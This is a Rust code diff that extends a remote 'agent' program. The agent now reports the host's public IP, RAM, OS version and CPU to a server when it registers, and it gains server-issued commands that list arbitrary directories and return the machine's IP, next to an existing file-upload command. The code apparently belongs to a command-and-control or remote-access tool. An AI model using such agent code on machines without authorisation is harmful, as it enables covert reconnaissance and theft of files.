@@ -29,6 +29,12 @@ struct RegisterRequest {
     hostname: String,
     os: String,
     arch: String,
+    ip: String,
+    ram: String,
+    #[serde(rename = "osVersion")]
+    os_version: String,
+    #[serde(rename = "cpuName")]
+    cpu_name: String,
 }
 
 #[derive(Deserialize)]
@@ -178,7 +184,20 @@ async fn main() {
         };
 
         if id.len() == 0 {
-            let id_resp = match register(&hostname, os_name, sys_arch, &mut stream).await {
+            let system_information = helpers::get_system_information();
+            let mut ip_address = "unknown".to_string();
+            if config::send_real_ip_on_start() {
+                match helpers::get_real_ip_address().await {
+                    Ok(ip) => {
+                        ip_address = ip;
+                    },
+                    Err(e) => {
+                        debug_println!("failed to get reap ip: {}", e);
+                    },
+                }
+            }
+
+            let id_resp = match register(&hostname, os_name, sys_arch, &system_information.os_version, &system_information.cpu_names_only, &ip_address, &system_information.memory, &mut stream).await {
                 Ok(id_resp) => id_resp,
                 Err(e) => {
                     debug_eprintln!("registration error: {}", e);
@@ -291,6 +310,68 @@ async fn main() {
                     return write_output;
                 }
 
+                if message.request == "/ls" {
+                    let agent_path= match env::current_exe() {
+                        Ok(agent_path) => agent_path,
+                        Err(e) => {
+                            debug_println!("error while getting agent's path: {}", e);
+                            return e.to_string();
+                        },
+                    };
+
+                    let dir = match agent_path.parent() {
+                        Some(dir) => dir,
+                        None => {
+                            return "couldd not extract agent's directory".to_string();
+                        },
+                    };
+
+                    let content = match helpers::get_directory_content(dir) {
+                        Ok(content) => content,
+                        Err(e) => {
+                            debug_println!("failed to get_directory_content: {}", e);
+                            return format!("failed to get_directory_content: {}", e);
+                        },
+                    };
+
+                    let json_content = match serde_json::to_string(&content) {
+                        Ok(j) => j,
+                        Err(e) => {
+                            debug_println!("error while converting dir content to json: {}", e);
+                            return e.to_string();
+                        },
+                    };
+
+                    return json_content;
+                }
+
+                if message.request.starts_with("/ls|") {
+                    let parts: Vec<&str> = message.request.split('|').collect();
+                    if parts.len() != 2 {
+                        return "command parsing failed".to_string();
+                    }
+
+                    let path = std::path::Path::new(parts[1]);
+
+                    let content = match helpers::get_directory_content(path) {
+                        Ok(content) => content,
+                        Err(e) => {
+                            debug_println!("failed to get_directory_content: {}", e);
+                            return format!("failed to get_directory_content: {}", e);
+                        },
+                    };
+
+                    let json_content = match serde_json::to_string(&content) {
+                        Ok(j) => j,
+                        Err(e) => {
+                            debug_println!("error while converting dir content to json: {}", e);
+                            return e.to_string();
+                        },
+                    };
+
+                    return json_content;
+                }
+
                 if message.request.starts_with("/upload-file|") {
                     match helpers::parse_upload_command(&message.request) {
                         Ok((file_path, file_id)) => {
@@ -339,6 +420,18 @@ async fn main() {
                         },
                         Err(e) => {
                             return format!("Error parsing the command: {}", e);
+                        }
+                    }
+                }
+
+                if message.request == "/get-ip" {
+                    match helpers::get_real_ip_address().await {
+                        Ok(ip) => {
+                            return ip;
+                        },
+                        Err(e) => {
+                            debug_println!("error getting the real ip: {}", e);
+                            return "unknown".to_string();
                         }
                     }
                 }
@@ -415,11 +508,15 @@ async fn main() {
 }
 
 #[inline]
-async fn register(hostname: &String, os: &str, arch: &str, stream: &mut DataStream) -> Result<RegisterResponse> {
+async fn register(hostname: &String, os: &str, arch: &str, os_version: &str, cpu_name: &str, ip: &str, ram: &str, stream: &mut DataStream) -> Result<RegisterResponse> {
     let identity = RegisterRequest{
         hostname: hostname.clone(),
         os: os.to_string(),
         arch: arch.to_string(),
+        ip: ip.to_string(),
+        os_version: os_version.to_string(),
+        cpu_name: cpu_name.to_string(),
+        ram: ram.to_string(),
     };
 
     let json_identity = match serde_json::to_string(&identity) {
